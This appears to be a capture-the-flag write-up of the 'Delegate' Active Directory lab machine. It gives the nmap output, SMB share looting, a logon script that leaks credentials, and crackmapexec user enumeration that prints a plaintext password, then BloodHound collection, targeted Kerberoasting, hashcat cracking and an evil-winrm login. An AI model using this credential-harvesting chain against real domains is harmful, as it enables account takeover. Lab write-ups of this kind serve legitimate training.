# KEY TAKE AWAYS

* SMB SHARE ENUM
* USER ENUM VIA SMB
* BLOODHOUND ENUM
* TARGETED KERBEROAST
* UNRESTRAINED DELEGATION

# NMAP

```
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-06-01 07:37:48Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-06-01T07:38:46+00:00
|_ssl-date: 2024-06-01T07:39:24+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Issuer: commonName=DC1.delegate.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-31T07:28:02
| Not valid after:  2024-11-30T07:28:02
| MD5:   7b2a:efb1:709e:1fff:28a9:03ed:56e9:50e5
| SHA-1: 3513:04a1:97c1:6ed1:c1aa:a850:b27c:2957:450f:711a
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQcsVhcU96XbhLib7Xq0N1YTANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9EQzEuZGVsZWdhdGUudmwwHhcNMjQwNTMxMDcyODAyWhcNMjQx
| MTMwMDcyODAyWjAaMRgwFgYDVQQDEw9EQzEuZGVsZWdhdGUudmwwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQD2t3df/kZ8kG70n6itUpQvIB1MJN0b3P4G
| nRGT9dGgdE8g/UDuyvmhjVTDRHQqn9nxFwPkTOnsApVQvYCpU1Up9BxAe+9lQYNT
| SSVDZhNB0pJgblTintBokCOFqGN6FyqUT81AAHukOPI35/8nq3/FiYFiz4xZXT49
| FXH8k3+zVknBASJ9ZK9qzkw/Hb9rphapFclXv2iYDu36aLVowZZoQAqRQoz86Q7R
| n5qA3XB/mssTNZ2pl1wfhAdoBOsyTcEmxeDDxmh46fSMgk4ndlyLdkxzPDp7jT6r
| Mmi3DoAm1unFIamimech74LTLtjd4fb1Be4QYXQY0O36bQy+KxFNAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAYOJXNrDSvowGZXjg1ixZXbSXtYD1JvSj3R8a4GaIyBaOzU7IuMxIizzx
| tYh2F69pgTfUh/07UrZL2AN62wqNOs21XcORpV4+AECxsThbxNim3DivDth66Wdl
| IjKTF7jqL8znN4s+fUe7MfiAOR6KLz6c6sz2BGY99/VQ/Y3sDztn/hfyVGTYqCh1
| U47L6o4O5UPAle8aXVpVU9tyRRE1mE+HBphdNtSQT+0LRbZ9ni8N/7pRHoB3uG48
| dOjjGPv7UIOs4BSUU6JYpPTNfauBX0r+Y0mHEfygUBNd5KHoHdKuCkw0Pl/YSz4A
| h7+ICQbRCNzzAKKvVXY4lDBIhMPv5w==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack Microsoft Windows RPC
49686/tcp open  msrpc         syn-ack Microsoft Windows RPC
49690/tcp open  msrpc         syn-ack Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack Microsoft Windows RPC
59594/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB ENUM
* smbclient --no-pass -L //$IP/
```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
```
* smbclient --no-pass //$IP/SYSVOL
```
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
```
* cat /delegate.vl/scripts/users.bat
```
if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator [password]   
```
#USER ENUM
* crackmapexec smb $IP -u 'A.Briggs' -p '[password]' --users
```
SMB         10.10.71.110    445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.10.71.110    445    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123 
SMB         10.10.71.110    445    DC1              [+] Enumerated domain user(s)
SMB         10.10.71.110    445    DC1              delegate.vl\N.Thompson                     badpwdcount: 0 desc: 
SMB         10.10.71.110    445    DC1              delegate.vl\J.Roberts                      badpwdcount: 0 desc: 
SMB         10.10.71.110    445    DC1              delegate.vl\R.Cooper                       badpwdcount: 0 desc: 
SMB         10.10.71.110    445    DC1              delegate.vl\b.Brown                        badpwdcount: 0 desc: 
SMB         10.10.71.110    445    DC1              delegate.vl\A.Briggs                       badpwdcount: 0 desc: 
SMB         10.10.71.110    445    DC1              delegate.vl\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account                                                                                   
SMB         10.10.71.110    445    DC1              delegate.vl\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain                                                                  
SMB         10.10.71.110    445    DC1              delegate.vl\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain 
```
# BLOODHOUND ENUM

* bloodhound-python -d delegate.vl -v --zip -c All -dc DC1.delegate.vl -ns 10.10.81.68 -u 'A.Briggs' -p '[password]'

![image](https://github.com/reneanto/write-ups/assets/44943249/d8691bc3-a481-4b7a-816e-c4eb65010328)

* python3 targetedKerberoast.py -v -d 'Delegate.vl' -u 'A.Briggs' -p '[password]'

# HASHCAT 

* hashcat -a 0 -m 13100 hash /usr/share/wordlists/rockyou.txt

# USER OWN

* evilwinrm -u N.Thompson -p '[password]' -i delegate.vl
